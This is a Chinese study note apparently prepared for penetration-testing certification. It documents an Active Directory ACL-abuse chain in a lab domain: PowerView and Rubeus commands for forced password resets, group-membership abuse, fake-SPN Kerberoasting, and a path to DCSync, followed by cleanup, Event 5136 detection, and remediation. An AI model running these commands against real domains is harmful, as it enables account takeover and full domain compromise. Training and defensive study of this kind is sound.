# 第 77 章 - AD ACL 濫用

## 標籤

- #cpts
- #chapter
- #active-directory
- #acl
- #powerview
- #bloodhound
- #privilege-escalation

## 學習目標

- 理解為何 Find-InterestingDomainAcl 效率低，應改用目標式 SID 搜尋。
- 用 Get-DomainObjectACL 配合 -ResolveGUIDs 找出可濫用的 ACE。
- 追蹤攻擊鏈：wley → damundsen → Help Desk Level 1 → IT → adunn → DCSync。
- 執行 ForceChangePassword、GenericWrite（加群組成員）、GenericAll（假 SPN Kerberoast）。
- 清理假 SPN 與群組成員資格。
- 用 Event ID 5136 偵測 ACL 變更。

---

## 理論基礎

```text
AD ACL（存取控制清單）基本概念：
  ACL  = 針對一個 AD 物件的所有存取控制條目集合
  ACE  = 單一存取控制條目（誰對誰有什麼權限）
  DACL = Discretionary ACL（決定存取允許/拒絕）
  SACL = System ACL（稽核用途）

常見可濫用的 ACE 類型：
  ┌───────────────────────────────┬──────────────────────────────────────────┐
  │ ACE 名稱                      │ 可執行的攻擊                             │
  ├───────────────────────────────┼──────────────────────────────────────────┤
  │ ForceChangePassword            │ 強制重設目標使用者密碼（無需知道舊密碼）│
  │ GenericWrite                   │ 修改物件屬性（加群組成員、設 SPN 等）  │
  │ GenericAll                     │ 完全控制物件（等同 DA 對該物件）        │
  │ WriteOwner                     │ 更改物件擁有者                          │
  │ WriteDACL                      │ 修改物件的 ACL（可自行加 ACE）          │
  │ AllExtendedRights              │ 執行所有擴充權限（含 Force-Change-Pass）│
  │ DS-Replication-Get-Changes     │ DCSync 必要權限之一                     │
  │ DS-Replication-Get-Changes-All │ DCSync 必要權限之二（需兩者同時擁有）  │
  └───────────────────────────────┴──────────────────────────────────────────┘

GUID 與 ACE 對應：
  00299570-246d-11d0-a768-00aa006e0529 → User-Force-Change-Password
  1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 → DS-Replication-Get-Changes
  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 → DS-Replication-Get-Changes-All
```

---

## 一、ACL 列舉

### 方法一：目標式 SID 搜尋（推薦）

```powershell
Import-Module .\PowerView.ps1

# 步驟 1：取得目標使用者 SID
$sid = Convert-NameToSid wley
# Convert-NameToSid → 將 SAM 帳號名稱轉換為 SID 字串

# 步驟 2：不加 -ResolveGUIDs（ObjectAceType 顯示原始 GUID，較難讀）
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# ObjectAceType: 00299570-246d-11d0-a768-00aa006e0529 → 需查表才知是什麼權限

# 步驟 3：加上 -ResolveGUIDs（ObjectAceType 顯示人類可讀名稱）
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# -ResolveGUIDs     → 將 ObjectAceType 的 GUID 轉為人類可讀名稱
# -Identity *       → 搜尋所有 AD 物件（大環境需要 1-2 分鐘）
# $_.SecurityIdentifier -eq $sid → 篩選出 wley 擁有的 ACE

# 關鍵輸出欄位：
# ObjectDN          → 被控制的物件（Dana Amundsen 的 DN）
# ActiveDirectoryRights → ExtendedRight
# ObjectAceType     → User-Force-Change-Password（加 -ResolveGUIDs 後可讀）
# SecurityIdentifier→ 擁有此 ACE 的帳號 SID（即 wley 的 SID）
```

### GUID 手動反查（不用 -ResolveGUIDs 時的替代方案）

```powershell
# 注意：若 PowerView 已匯入，需在新的 PS session 執行（否則衝突報錯）
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
  -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |
  Select-Object Name, DisplayName, DistinguishedName, rightsGuid |
  Where-Object { $_.rightsGuid -eq $guid } | Format-List
# Get-ADRootDSE → 取得 AD 根 DSE，用於建構 Extended-Rights 的搜尋根
# -Filter {ObjectClass -like 'ControlAccessRight'} → 只查擴充權限物件
# 輸出：Name = User-Force-Change-Password, DisplayName = Reset Password
```

### 方法二：原生 cmdlet（不使用 PowerView）

```powershell
# 建立所有網域使用者清單
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
# -Filter *             → 取得所有使用者
# -ExpandProperty       → 只輸出 SamAccountName 字串值

# 對每個使用者查詢 ACL，篩選出 wley 擁有的 ACE
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
  Get-Acl "AD:\$(Get-ADUser $line)" |
  Select-Object Path -ExpandProperty Access |
  Where-Object { $_.IdentityReference -match 'INLANEFREIGHT\\wley' }
}
# Get-Acl "AD:\..."  → 取得 AD 物件的 ACL（內建 Security cmdlet，不需 PowerView）
# -ExpandProperty Access → 展開 Access 屬性（所有 ACE 的列表）
# IdentityReference      → 篩選特定帳號（wley）擁有的 ACE
# ObjectType 仍為 GUID → 需用 Get-ADObject 方法反查
# 注意：效率遠低於 PowerView，大環境執行時間極長
```

### 追蹤攻擊鏈（鏈式列舉）

```powershell
# 第一層：wley → damundsen (ForceChangePassword)
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# 結果：ObjectDN = damundsen, ObjectAceType = User-Force-Change-Password

# 第二層：damundsen → Help Desk Level 1 群組 (GenericWrite)
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2}
# 結果：ObjectDN = Help Desk Level 1, ActiveDirectoryRights = GenericWrite

# 確認巢狀群組成員資格
Get-DomainGroup -Identity "Help Desk Level 1" | Select-Object memberof
# 結果：memberof = CN=Information Technology,...
# → 加入 Help Desk Level 1 = 自動繼承 Information Technology 群組的所有權限

# 第三層：Information Technology → adunn (GenericAll)
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid}
# 結果：ObjectDN = adunn, ActiveDirectoryRights = GenericAll

# 第四層：adunn → 網域物件 (DCSync)
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid}
# 結果：ObjectDN = DC=INLANEFREIGHT,DC=LOCAL
# ObjectAceType = DS-Replication-Get-Changes + DS-Replication-Get-Changes-In-Filtered-Set
# → adunn 擁有 DCSync 所需的兩個複寫權限
```

---

## 二、BloodHound 視覺化

```text
步驟：
  1. 上傳 SharpHound 收集的資料
  2. 搜尋 wley 節點 → Node Info → Outbound Control Rights
     → First Degree Object Control: 1（對 damundsen 的直接控制）
     → Transitive Object Control: 16（透過攻擊鏈最終可控制的物件數）
  3. 對邊（Edge）按右鍵 → Help
     → 顯示攻擊方法、可用工具、Opsec 考量、外部參考

預先建立查詢確認 DCSync：
  → "Find Principals with DCSync Rights"
  → 快速驗證 adunn 擁有 DCSync 權限

BloodHound vs 手動：
  手動 → 理解底層機制，PowerView 被封鎖時的備案
  BH  → 秒級找出完整路徑，視覺化呈現更易溝通給客戶
```

---

## 三、ACL 濫用攻擊鏈

```text
wley（已控制，Responder 取得 NTLMv2 → Hashcat 破解）
  ↓ ForceChangePassword → Set-DomainUserPassword
damundsen（重設密碼後取得控制）
  ↓ GenericWrite on Help Desk Level 1 → Add-DomainGroupMember
  ↓ 巢狀成員資格 → 繼承 Information Technology 的 GenericAll
  ↓ GenericAll on adunn → Set-DomainObject（假 SPN）→ Rubeus kerberoast → Hashcat
adunn（取得明文密碼）
  ↓ DS-Replication-Get-Changes + In-Filtered-Set
DCSync → 所有使用者 NTLM hash → 完全控制網域
```

### 步驟 1：建立 PSCredential 物件（以 wley 身分操作）

```powershell
$SecPassword = ConvertTo-SecureString '<wley 的密碼>' -AsPlainText -Force
# ConvertTo-SecureString -AsPlainText → 明文轉 SecureString（PS 記憶體安全存放）
# -Force → 抑制安全警告

$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
# PSCredential = 使用者名稱 + SecureString 的封裝物件
# → 後續 -Credential $Cred 均以 wley 身分執行（不需切換 session）
```

### 步驟 2：ForceChangePassword → 重設 damundsen 密碼

```powershell
# 定義新密碼
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# 強制重設（以 wley 身分，利用 ForceChangePassword 權限）
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen `
  -AccountPassword $damundsenPassword `
  -Credential $Cred -Verbose
# -Identity damundsen     → 目標使用者
# -AccountPassword        → 新密碼的 SecureString
# -Credential $Cred       → 以 wley 身分執行
# 成功輸出：Password for user 'damundsen' successfully reset

# Opsec 注意：
# → 變更密碼會觸發事件 ID 4723/4724
# → 若 damundsen 正在登入，其 session 可能中斷
# → 評估結束後必須告知客戶此變更
```

### 步驟 3：GenericWrite → 加入群組

```powershell
# 以 damundsen 建立新的 PSCredential
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# 確認 damundsen 目前不在群組中
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select-Object -ExpandProperty Members
# -Properties * → 載入所有屬性（含 Members）
# -ExpandProperty Members → 展開成員列表

# 將 damundsen 加入群組（以 damundsen 身分，利用 GenericWrite 權限）
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' `
  -Credential $Cred2 -Verbose
# -Identity → 目標群組名稱
# -Members  → 要新增的成員
# 成功輸出：Adding member 'damundsen' to group 'Help Desk Level 1'

# 確認加入
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select-Object MemberName
# damundsen 應出現在清單中
```

### 步驟 4：GenericAll → 假 SPN + Targeted Kerberoast

```powershell
# 設定假 SPN（以 damundsen 身分，透過 IT 群組繼承的 GenericAll 對 adunn）
Set-DomainObject -Credential $Cred2 -Identity adunn `
  -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
# -SET @{serviceprincipalname=...} → 覆寫 SPN 屬性
# 任何格式的 SPN 均可（service/hostname）
# 設定後 adunn 帳號出現 SPN → 變得可被 Kerberoast

# 執行 Kerberoast（從當前 Windows 主機）
.\Rubeus.exe kerberoast /user:adunn /nowrap
# /user:adunn → 只針對 adunn，避免影響其他 SPN 帳號
# /nowrap     → hash 不換行，方便複製
# 取得 $krb5tgs$23$* ... → 複製 hash

# 離線破解（Linux 端）
hashcat -m 13100 adunn_hash.txt /usr/share/wordlists/rockyou.txt
# -m 13100 → TGS-REP / Kerberoast 模式
```

---

## 四、清理（依序執行）

```text
清理順序（順序不可調換）：
  1. 先移除假 SPN（此步驟需 damundsen 仍在 IT 群組內才有 GenericAll 權限）
  2. 再將 damundsen 從 Help Desk Level 1 移除
  3. 告知客戶重設 damundsen 密碼（或協助重設）
  4. 在報告中記錄所有變更
```

```powershell
# 步驟 1：移除假 SPN（仍以 $Cred2 = damundsen 身分執行）
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
# -Clear serviceprincipalname → 清除 SPN 屬性（不是 -SET，是清空）
# 成功輸出：Clearing 'serviceprincipalname' for object 'adunn'

# 步驟 2：將 damundsen 從群組移除
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' `
  -Credential $Cred2 -Verbose
# 成功輸出：Removing member 'damundsen' from group 'Help Desk Level 1'
# 回傳 True = 成功

# 確認已移除（應無輸出）
Get-DomainGroupMember -Identity "Help Desk Level 1" |
  Select-Object MemberName |
  Where-Object { $_.MemberName -eq 'damundsen' }
# 無輸出 = 確認移除成功
```

---

## 五、偵測與修復

### Event ID 5136 分析

```powershell
# 事件路徑：事件檢視器 → Windows Logs → Security → 篩選 Event ID 5136
# 需先啟用：進階安全性稽核原則 → DS Access → 稽核目錄服務變更

# 事件中的 SDDL 轉可讀格式
ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)..." | Select-Object -ExpandProperty DiscretionaryAcl
# ConvertFrom-SddlString → 內建 cmdlet，將 SDDL 字串解析為可讀 ACL
# -ExpandProperty DiscretionaryAcl → 只顯示 DACL 部分（決定存取的規則）

# 可疑輸出範例：
# INLANEFREIGHT\mrb3n: AccessAllowed (GenericWrite, ...)
# → mrb3n 被賦予 GenericWrite → 可能是 ACL 攻擊行為

# 相關 Event ID：
# 4728 / 4732 / 4756 → 安全群組成員被新增
# 4723 / 4724        → 使用者密碼被重設（本人 / 其他人）
# 5136               → 目錄服務物件屬性被修改（ACL 變更、SPN 設定）
```

### 修復建議

```text
1. 稽核並移除危險 ACL
   → 定期執行 BloodHound，識別可移除的危險 ACE

2. 監控高影響力群組成員資格
   → Domain Admins / Backup Operators / Account Operators 等
   → 成員變更觸發即時告警

3. 啟用 Advanced Security Audit Policy → DS Access
   → 確保 Event 5136 被記錄並轉入 SIEM

4. 最小權限原則加域帳號
   → 加入網域的帳號自動獲得 All Extended Rights（可讀 LAPS 密碼）
   → 應使用專屬低權帳號，完成後立即降權或停用
```

---

## 判斷邏輯

```
取得低權憑證
└── 目標式 ACL 列舉
    ├── Convert-NameToSid USER
    └── Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
        ├── ForceChangePassword on 使用者
        │   └── Set-DomainUserPassword → 重設密碼 → 以新帳號繼續
        ├── GenericWrite on 群組
        │   ├── Add-DomainGroupMember → 加入群組
        │   └── 確認巢狀成員資格 → Get-DomainGroup | select memberof
        ├── GenericAll on 使用者
        │   ├── 選項 A：ForceChangePassword
        │   └── 選項 B：Set-DomainObject 假 SPN → Rubeus kerberoast → 破解
        └── DS-Replication-Get-Changes + In-Filtered-Set
            └── → DCSync 攻擊（見第 80 章）
```

---

## 速查表

```powershell
# 取得 SID
$sid = Convert-NameToSid USERNAME

# 目標式 ACL 搜尋
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# 群組巢狀確認
Get-DomainGroup -Identity "GROUP" | Select-Object memberof

# 建立 PSCredential
$SecPass = ConvertTo-SecureString 'PASS' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\USER', $SecPass)

# ForceChangePassword
Set-DomainUserPassword -Identity TARGET -AccountPassword $NewPass -Credential $Cred -Verbose

# GenericWrite → 加群組成員
Add-DomainGroupMember -Identity 'GROUP' -Members 'USER' -Credential $Cred -Verbose

# 確認群組成員
Get-DomainGroupMember -Identity 'GROUP' | Select-Object MemberName

# GenericAll → 假 SPN
Set-DomainObject -Credential $Cred -Identity TARGET -SET @{serviceprincipalname='fake/LEGIT'} -Verbose

# Targeted Kerberoast
.\Rubeus.exe kerberoast /user:TARGET /nowrap

# 清理：移除假 SPN（先做）
Set-DomainObject -Credential $Cred -Identity TARGET -Clear serviceprincipalname -Verbose

# 清理：移除群組成員（後做）
Remove-DomainGroupMember -Identity 'GROUP' -Members 'USER' -Credential $Cred -Verbose

# 偵測：SDDL 轉可讀
ConvertFrom-SddlString "O:BAG:BAD:..." | Select-Object -ExpandProperty DiscretionaryAcl
```

---

## 關聯筆記

- [[73B-有憑證AD列舉Windows|第 73B 章 - 有憑證 AD 列舉（Windows）]]
- [[75-Kerberos攻擊|第 75 章 - Kerberos 攻擊]]
- [[80-網域主導與持久化|第 80 章 - 網域主導與持久化]]
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory]]
